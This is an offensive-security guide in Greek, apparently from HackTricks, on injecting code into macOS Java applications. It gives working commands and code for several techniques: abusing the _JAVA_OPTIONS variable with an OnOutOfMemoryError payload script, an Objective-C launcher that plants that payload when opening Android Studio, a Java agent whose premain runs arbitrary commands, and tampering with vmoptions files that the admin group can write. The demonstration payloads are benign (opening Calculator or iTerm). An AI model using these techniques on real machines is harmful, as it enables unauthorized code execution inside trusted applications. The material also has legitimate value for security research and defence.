# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Βρείτε τις εφαρμογές Java που είναι εγκατεστημένες στο σύστημά σας. Παρατηρήθηκε ότι οι εφαρμογές Java στο **Info.plist** θα περιέχουν κάποιες παραμέτρους java που περιέχουν τη συμβολοσειρά **`java.`**, οπότε μπορείτε να αναζητήσετε αυτό:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για να εισάγει αυθαίρετες παραμέτρους java στην εκτέλεση μιας εφαρμογής που έχει μεταγλωττιστεί σε java:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Για να το εκτελέσετε ως νέα διαδικασία και όχι ως παιδί του τρέχοντος τερματικού, μπορείτε να χρησιμοποιήσετε:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Ωστόσο, αυτό θα προκαλέσει ένα σφάλμα στην εκτελούμενη εφαρμογή, ένας άλλος πιο διακριτικός τρόπος είναι να δημιουργήσετε έναν java agent και να χρησιμοποιήσετε:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Η δημιουργία του πράκτορα με **διαφορετική έκδοση Java** από την εφαρμογή μπορεί να προκαλέσει κατάρρευση της εκτέλεσης τόσο του πράκτορα όσο και της εφαρμογής

Όπου ο πράκτορας μπορεί να είναι:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Για να μεταγλωττίσετε τον πράκτορα, εκτελέστε:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Με το `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Και στη συνέχεια εξάγετε τη μεταβλητή env και εκτελέστε την εφαρμογή java όπως:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions αρχείο

Αυτό το αρχείο υποστηρίζει την καθορισμένη **Java params** όταν εκτελείται η Java. Μπορείτε να χρησιμοποιήσετε μερικά από τα προηγούμενα κόλπα για να αλλάξετε τις java params και **να κάνετε τη διαδικασία να εκτελεί αυθαίρετες εντολές**.\
Επιπλέον, αυτό το αρχείο μπορεί επίσης να **περιλαμβάνει άλλα** με τον κατάλογο `include`, οπότε μπορείτε επίσης να αλλάξετε ένα περιλαμβανόμενο αρχείο.

Ακόμα περισσότερο, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα `vmoptions`** αρχείο.

Ορισμένες εφαρμογές όπως το Android Studio υποδεικνύουν στην **έξοδό τους πού ψάχνουν** για αυτά τα αρχεία, όπως:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Αν δεν το κάνουν, μπορείτε εύκολα να το ελέγξετε με:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Σημειώστε πόσο ενδιαφέρον είναι ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το αρχείο **`/Applications/Android Studio.app.vmoptions`**, ένα μέρος όπου οποιοσδήποτε χρήστης από την **`admin` ομάδα έχει δικαίωμα εγγραφής.** 

{{#include ../../../banners/hacktricks-training.md}}
